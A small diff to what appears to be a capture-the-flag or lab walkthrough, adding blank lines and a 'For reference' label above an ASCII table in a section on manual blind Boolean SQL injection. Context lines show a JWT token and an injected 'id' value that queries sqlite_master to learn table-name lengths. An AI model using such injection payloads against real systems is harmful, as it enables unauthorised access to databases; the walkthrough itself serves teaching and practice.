@@ -335,6 +335,8 @@ token : b'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYmxua24iLCJleHAiO
 Rpc succeeded with OK status
 ```
 
+
+
 ## Manual blind Boolean based injection 
 
 We have 2 tables
@@ -347,6 +349,7 @@ First table name is of length 8
 { "id":"653 or (SELECT length(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name not like 'sqlite_%' limit 1 offset 0)=8" }
 ```
 
+For reference
 ```bash
 ascii -x
    00 NUL    10 DLE    20      30 0    40 @    50 P    60 `    70 p
